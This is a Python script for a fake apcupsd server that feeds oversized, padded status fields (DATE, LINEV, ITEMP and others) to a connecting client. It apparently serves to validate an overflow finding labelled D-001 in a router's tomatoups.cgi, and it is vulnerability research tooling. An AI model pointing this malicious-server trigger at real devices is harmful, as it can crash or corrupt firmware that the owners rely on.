#!/usr/bin/env python3
import argparse
import socket
import struct
import time


def send_pkt(conn: socket.socket, payload: bytes) -> None:
    conn.sendall(struct.pack(">H", len(payload)))
    conn.sendall(payload)


def recv_exact(conn: socket.socket, size: int) -> bytes:
    chunks = bytearray()
    while len(chunks) < size:
        part = conn.recv(size - len(chunks))
        if not part:
            raise ConnectionError(f"short read: wanted {size}, got {len(chunks)}")
        chunks.extend(part)
    return bytes(chunks)


def format_line(field: str, value: str) -> bytes:
    # Match the fixed-width APCUPSD text layout used by sub_9068.
    return f"{field:<9}: {value}\n".encode("ascii")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Multi-field fake apcupsd server for tomatoups.cgi D-001 validation"
    )
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=3551)
    parser.add_argument("--pad", type=int, default=512)
    parser.add_argument("--date-pad", type=int, default=None)
    parser.add_argument("--fill", default="A")
    parser.add_argument("--sleep", type=float, default=0.2)
    parser.add_argument("--max-clients", type=int, default=1)
    args = parser.parse_args()

    fill = args.fill[:1] or "A"
    value = fill * args.pad
    date_value = fill * (args.date_pad if args.date_pad is not None else args.pad)
    lines = [
        format_line("DATE", date_value),
        format_line("LINEV", value),
        format_line("MINLINEV", value),
        format_line("MAXLINEV", value),
        format_line("ITEMP", value),
        b"END APC      : 1\n",
    ]

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((args.host, args.port))
        srv.listen(1)
        print(f"[+] listening on {args.host}:{args.port}")
        served = 0
        while args.max_clients <= 0 or served < args.max_clients:
            conn, addr = srv.accept()
            served += 1
            with conn:
                print(f"[+] client connected #{served}: {addr[0]}:{addr[1]}")
                try:
                    hdr = recv_exact(conn, 2)
                    req_len = struct.unpack(">H", hdr)[0]
                    req = recv_exact(conn, req_len)
                    print(f"[+] received request bytes: {req_len} -> {req!r}")
                except Exception as exc:
                    print(f"[!] recv request failed: {exc}")
                for line in lines:
                    send_pkt(conn, line)
                    print(f"[+] sent packet length={len(line)} preview={line[:32]!r}")
                time.sleep(args.sleep)
                print("[+] payload sent, closing connection")


if __name__ == "__main__":
    main()
